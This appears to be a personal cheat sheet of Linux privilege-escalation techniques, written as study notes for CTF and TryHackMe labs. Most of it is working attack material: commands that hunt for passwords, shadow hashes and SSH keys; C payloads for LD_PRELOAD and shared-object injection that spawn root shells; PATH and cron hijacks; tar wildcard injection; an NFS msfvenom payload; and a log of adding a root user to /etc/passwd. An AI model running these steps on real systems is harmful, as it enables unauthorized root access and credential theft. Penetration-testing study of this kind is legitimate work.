
# Linux Privilege Escalation

### CheckList 

1. System Enum 
    1. `uname -a` 
        1. Kernel Exploits 
    3. `cat /proc/version`
    4. `cat /etc/issue `
    5. `lscpu`
    6. `ps aux | grep user ` -- services with optional grep
        - use pspy to snoop on processes 
2. User Enum
    1. `whoami`
    2. `id`
    3. `sudo -l`
    4. `cat /etc/password`
    5. `cat /etc/shadow`
    6. `cat /etc/group`
    7. `history`
3. Network Enum
    1. `ifconfig` or `ip a` 
    2. `ip route` 
    3. `arp -a` or `ip neigh` 
    5. `netstat -ano` 
4. Password Hunting
    1. `grep --color=auto -rnw '/' -ie "PASSWORD" --color always 2> /dev/null`
        1. Payloads all the things 
    3. `locate password | more` 
    4. `find / -name authorized_keys` or `id_rsa`
    5. `history`
    6. `.bash_history`
5. File Permissions 
    1. `ls -la /etc/passwd`
    2. `ls -la /etc/shadow`
        1. Remove password from passwd or shadow
        2. Change uid to the root user uid 
        3. Change group to root group 
        4. `unshadow pass and shaadow` 
        5. `john or hashcat` 
6. SSH Keys
    1. Payloads all the things
    2. `find / -name authorized_keys 2> /dev/null`
    3. `find / -name id_rsa 2> /dev/null`
    4. `ssh -i id_rsa root@5.5.5.5` - user private keys 

7. Sudo 
    1.  `sudo -l` 
        - Looking for (root) nopasswd
        - GTFO Bins 
    2. Intended functionality 
        - What you can sudo to, and lookup privesc with that. 
        - wget or apache2 to read files, etc. 
    3. sudo su CVE-2019-18634
        - Buffer overflow on sudo 
        - Check for character masking on `sudo su`
    4. SUDO_KILLER

7. LDPreload  
    1. Allows for the Linking of malicious libraries before executing program. 
    1. Identify - `sudo -l`
    2. See `env_keep+=LD_PRELOAD` 
    3. ![](image-kmcuxgdl.png)
    4. Load our library before all other libraries 
    5. write malicious library 
    6. Export with so 
    7. `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
    8. Run as sudo for any program you can run as sudo. 
    8. `sudo LD_PRELOAD=/home/usr/shell.so apache2` 

~~~c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
~~~


8. SUID
    1. `find / -perm -u=s -type f 2>/dev/null`

9. Check for Shared Object Injection
    1. `find / -type f -perm -04000 -ls 2>/dev/null`
    2. `ls la /item/soitem` to see permissions looking for suid
    3. `strace soitem 2>&1 | grep -i -E "open|access|no such file"` try to see what's executing
    4. Write malicious c from below and compile 
    5. `gcc -shared -fPIC -o /home/user.config/libcacl.so /home/user/libcalc.c`

~~~c
#include <stdio.h>
#include <stdlib.h>

static voicd inject() __attribute__((constructor));

void inject() {
        system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
~~~

10. Escalation via Binary Symlinks 

    - nnginx to root using linux exploit suggester [CVE-2016-1247]
    - requires suid on sudo 
    - `find / -type f -perm -04000 -ls 2>/dev/null`

11. Environmental Variables (path replacement) 
    - `env`
    - `find / -type f -perm -04000 -ls 2>/dev/null`
    - find something running suid run strings to see if something is being run a kin to `service apache2 start`
    - Make a malicious payload. 
    - `echo int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c`
    - compile
    - `gcc /tmp/service.c -o /tmp/service`
    - modify path
    - `export PATH=/tmp:$PATH`
    - Another Example if the absolute path is used. 
    - Create malicious function 
    - `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
    - export function
    - `export -f /usr/sbin/service`

12. Capabilities 
    - like suid but modular and limited. 
    - Look for capabilities.
    - `getcap -r / 2>/dev/null`

13. Cron Jobs 
    - `cat /etc/crontab` list cron jobs 
    - look to see if an explicit path is used, if it is just a file name look at the path variable for crontab. Replace with malicious file `echo 'cp /bin/bash /tmp; chmod +s /tmp/bash' > filename.sh` then `chmode +x filename.sh`
    - payloads all the things (scheduled tasks)
    - `systemctl list-timers --all`
    - If a path is using wildcards with tar as target you can manipulate it. 
    - `echo 'cp /bin/bash /tmp; chmod +s /tmp/bash' > filename.sh` then `chmode +x filename.sh` 
    - `touch /home/usr/--checkpoint=1`
    - `touch /home/user/--checkpoint-action=exec=sh\runme.sh`
    - Look for overwritable files that are executing as root 

14. SHELLOPTS and xtrace 
    - bash has a debugging mode where it can run commands 
    - `env -i SHELLOPTS=xtrace PS$='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2`

15. NFS 
    - Available shares are stored in `/etc/exports` 
    - `showmount -e <target>`
    - `nmap -sV -script=nfs-showmount <target>`
    - `mount -o rw,vers=2 <target>:<share> <local_dir>` 
    - Mount and upload a file if root is not squashed. 
    - `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
        - `chmod +xs /tmp/nfs/shell/elf`

## Challenges 

- Sudo - Hacktivities simple ctf
    - Join 
    - Deploy 

## Practice 

### SUDO SUID 

- [Linux Privesc Playground](https://tryhackme.com/room/privescplayground)

### General 
- [Linux PrivEsc - Tiberius] (https://tryhackme.com/room/linuxprivesc)



### Users 

- `whomai`
- `id`
- `cat /etc/passwd` List All Users 
- `find / -perm -u=s -type f 2>/dev/null` - find files with suid bit set. suid bit runs as root  
- `find / -perm -4000 2>/dev/null` - find suid 
- `sudo -l` see what commands can be run as sudo
- `cat /etc/passwd` - list user 
- `cat /etc/shadow` - see password hashes 
- `cat /etc/group` - groups
- `history` 

### Network 

- `ip a` or `ifconfig a`  Interface info 
- `route` or `routel` or `/sbin/route` List routes
- `ip a` ifconfig (old command) 
- `route`
- `ip route`
- `arp -a`  arp
- `ip neigh` arp 
- `/etc/iptables` contains firewall files
- `iptables-save` or `iptables-restore` search for the commands and investigate 
- `iptables` requires root

### Host 

- `hostname`
- `cat /etc/issue` OS 
- `cat /etc/*-release` OS 
- `uname -a` Kernel and Arch 
- `lscpu` - see cpu data

### Programs / Files 

- `ps aux` List All Services 
- `ss -anp` or `netstat anp` 
- `ls -lah /etc/cron*` List Cron schedules 
- `cat /etc/crontab` Another Cron 
- `dpkg -l` or `rpm` check for linux packages. Find syntax per packagemanager 
- `find / -writable -type d 2>/dev/null` check for file permissions 
- `mount` or `cat /etc/fstab` - List partitions 
- `/bin/lsblk` to read disks 
- `lsmod` driver enum, listing modules
- `/sbin/modinfo libdata` get info about specific modules (modName = libata) 


### Password Hunting 

- Look at payloadsallthething 
- `grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null` find keyworks with passwords 
- `locate password | more` find files with password 
- `find / -name authorized_keys 2> /dev/null` or file name `id_resa` SSH keys 
- `~/.bash_history | grep -i passw`
- run unshadowed files through hashcat on windows 
- hashcat unshadow `hashcat65.exe -m 1800 creds.txt rockyou.txt -O`
- `ssh -i filename root@ip` 

### Automated tools 

### Fix Later


**LD Preload**

- make a maliciou library 
~~~c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
    
}
~~~

- `gcc -fPIC -shared -o shell.so shell.c -nostartfiles` compile 
- `sudo LD_PRELOAD=/home/user/kali/shell.so apache2`

**Challenge Machines**
- Simple CTF 

**SUID**

Look for shared object injection and environment variable

**capabilities** 


# Privilege Escalation 
## Linux
### Bad Permissions on Passwd 
~~~bash
student@debian:/var/scripts$ openssl passwd evil
5qL5bp5Q1K.7Y
student@debian:/var/scripts$ echo "root2:5qL5bp5Q1K.7Y:0:0:root:/root:/bin/bash" >> /etc/passwd
student@debian:/var/scripts$ su root2
Password: 
root@debian:/var/scripts# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/var/scripts# 
~~~


### Additional Tools

- Linpeas <https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS>
- Linenum.sh <https://github.com/rebootuser/LinEnum>
- Linux Eploit Suggester <https://github.com/mzet-/linux-exploit-suggester>
- Linuxprivchecker.py <https://github.com/sleventyeleven/linuxprivchecker>
- PayloadsAllTheThings <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md>
- GTFOBins https://gtfobins.github.io/
- TryHackMe Linux PrivEsc Playground 
- LDPRELOAD <https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/>
- <https://github.com/DominicBreuker/pspy>
- Linpeas <https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS>
- Linenum.sh <https://github.com/rebootuser/LinEnum>
- Linux Eploit Suggester <https://github.com/mzet-/linux-exploit-suggester>
- Linuxprivchecker.py <https://github.com/sleventyeleven/linuxprivchecker>
- PayloadsAllTheThings <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md>
- GTFOBins https://gtfobins.github.io/
- TryHackMe Linux PrivEsc Playground 
- LDPRELOAD <https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/>
- <https://github.com/DominicBreuker/pspy>
- unix-privesc-check 

### Enum Tools

- dirsearch 
- Seclists top100
- enum subdomains wfuzz `wfuzz -c -f sub-fighter -w top5000.txt 'http://cms.htm' -H "Host: FUZZ.cmess.htm --hw 290"`
- crackstation - password hash checker 

### suid 

1. Find suid perm files
2. `find / -perm -u=s -type f 2>/dev/null`

`strace` look at process execution 
`strings` print sequence of printable characters in files 


### Capabilities 

- `getcap -r / 2>/dev/null`
- `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`


### NFS Root Squashing 
perform actions as root. 

- check for root squashing `cat /etc/exports`
- `showmount -e 192.168.4.67`  see what's mountable
- `mkdir /tmp/mountme`
- `mount -o rw,vers=2 192.168.4.67:/tmp /tmp mountme`
- `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c` 
- compile `gcc /tmp/mountme/x.c -o /tmp/mountme/x` 

